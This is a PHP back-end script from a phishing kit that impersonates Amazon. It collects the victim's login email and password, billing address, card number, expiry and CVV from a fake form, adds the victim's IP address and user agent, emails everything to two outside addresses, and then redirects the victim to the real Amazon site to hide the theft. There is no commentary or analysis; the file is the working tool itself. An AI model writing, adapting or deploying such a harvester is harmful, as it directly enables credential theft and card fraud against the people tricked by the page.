<?

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$hostname = getenv('HTTP_HOST');
$message .= "--------Created By mR.j0n3z -----\n";
$message .= "Online ID    : ".$_POST['auth-email']."\n";
$message .= "Password     : ".$_POST['auth-password']."\n";
$message .= "----------------------------------\n";
$message .= "Name On Card: ".$_POST['auth-customer-name']."\n";
$message .= "Billing Address: ".$_POST['auth-customer-name0']."\n";
$message .= "City: ".$_POST['auth-customer-name1']."\n";
$message .= "State: ".$_POST['auth-customer-name2']."\n";
$message .= "Zip: ".$_POST['auth-customer-name3']."\n";
$message .= "Card Number: ".$_POST['addCreditCardNumber']."\n";
$message .= "Expiry: ".$_POST['exp']."\n";
$message .= "Cvv: ".$_POST['auth-pho']."\n";
$message .= "Cvv: ".$_POST['auth-phone-number2']."\n";
$message .= "--------------i.p----------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "-------Created By j0n3z----------\n";


$recipient = "mark.mcgraw111@gmail.com,mark.mcgraw111@yandex.com";
$subject = "Amazon .|$ip";
$headers = "Moded By mR.j0n3z";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
header("Location: http://amazon.com");
?>